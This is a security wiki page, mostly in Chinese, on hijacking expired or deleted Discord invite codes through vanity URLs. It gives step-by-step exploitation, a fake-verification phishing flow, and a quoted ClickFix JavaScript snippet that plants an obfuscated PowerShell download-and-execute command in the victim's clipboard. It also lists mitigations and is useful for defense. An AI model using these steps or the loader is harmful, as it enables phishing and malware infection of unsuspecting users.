# Discord Invite Hijacking

{{#include ../../banners/hacktricks-training.md}}

Discord invite hijacking 利用 custom vanity links 的复用规则：已过期的临时 invite code，或由小写字母和数字组成、已被删除的永久 code，可能会在 Level 3 boosted server 上被注册为 vanity link。当原始 server 失去 Level 3 Boost 时，custom vanity link 同样可能变为可用；对于包含大写字母的临时 invite，攻击者可以在常规 invite 仍然有效时，预先注册其小写形式的 vanity link，但只有在该 invite 过期后才会开始重定向。<sup>[[1]](#references)[[2]](#references)</sup>

## Invite Types and Hijack Risk

观察到的风险因 invite 类型而异：<sup>[[1]](#references)[[2]](#references)</sup>

| Invite Type           | Hijackable? | Condition / Comments                                                                                       |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Temporary Invite Link | ✅          | 过期后，该 code 会变为可用，并可由 boosted server 重新注册为 vanity URL。 |
| Permanent Invite Link | ⚠️          | 如果被删除且仅由小写字母和数字组成，该 code 可能会再次变为可用。        |
| Custom Vanity Link    | ✅          | 如果原始 server 失去其 Level 3 Boost，其 vanity invite 将变为可供新用户注册。    |

## Exploitation Steps

1. Reconnaissance
- 监控论坛、社交媒体、Telegram channels 等公开来源，寻找符合 `discord.gg/{code}` 或 `discord.com/invite/{code}` 模式的 invite links。<sup>[[1]](#references)</sup>
- 收集感兴趣的 invite codes（temporary 或 vanity）。<sup>[[1]](#references)</sup>
2. Pre-registration
- 创建或使用具有 Level 3 Boost 权限的现有 Discord server。<sup>[[1]](#references)[[2]](#references)</sup>
- 在 **Server Settings → Vanity URL** 中尝试分配目标 invite code。如果被接受，该 code 就会由 malicious server 保留。<sup>[[1]](#references)</sup>
3. Hijack Activation
- 对于 temporary invites，等待原始 invite 过期（如果你控制 source，也可以手动删除）。<sup>[[1]](#references)</sup>
- 对于包含大写字母的 codes，可以立即认领其小写变体，但只有在过期后才会激活重定向。<sup>[[1]](#references)</sup>
4. Silent Redirection
- 劫持生效后，访问旧 link 的用户会被无缝发送到 attacker-controlled server。<sup>[[1]](#references)</sup>

## Phishing Flow via Discord Server

1. 限制 server channels，使其仅显示 **#verify** channel。<sup>[[1]](#references)</sup>
2. 部署 bot（例如 **Safeguard#0786**），提示新用户通过 OAuth2 进行验证。<sup>[[1]](#references)</sup>
3. Bot 将用户重定向到 phishing site（例如 `captchaguard.me`），伪装成 CAPTCHA 或 verification 步骤。<sup>[[1]](#references)</sup>
4. 实施 **ClickFix** UX trick：<sup>[[1]](#references)</sup>
- 显示损坏的 CAPTCHA 消息。
- 引导用户打开 **Win+R** 对话框，粘贴预加载的 PowerShell command，然后按 Enter。

### ClickFix Clipboard Injection Example

该 campaign 使用 JavaScript 将 malicious PowerShell command 复制到 clipboard：<sup>[[1]](#references)</sup>
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
这种方法避免了直接下载文件，并利用用户熟悉的 UI 元素来降低用户的怀疑。<sup>[[1]](#references)</sup>

## Mitigations

- 优先使用永久 invite links，并确保代码至少包含一个大写字母；包含大写字母的已删除永久代码无法作为 vanity links 重复使用。<sup>[[1]](#references)</sup>
- 定期轮换 invite codes，并撤销旧链接。
- 监控 Discord server boost 状态和 vanity URL claims。<sup>[[1]](#references)[[2]](#references)</sup>
- 教育用户验证服务器真实性，并避免执行从剪贴板粘贴的 commands。

## References

- [1] [从信任到威胁：被劫持的 Discord 邀请链接被用于多阶段 malware 投递](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [自定义邀请链接 – Discord 支持](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
{{#include ../../banners/hacktricks-training.md}}
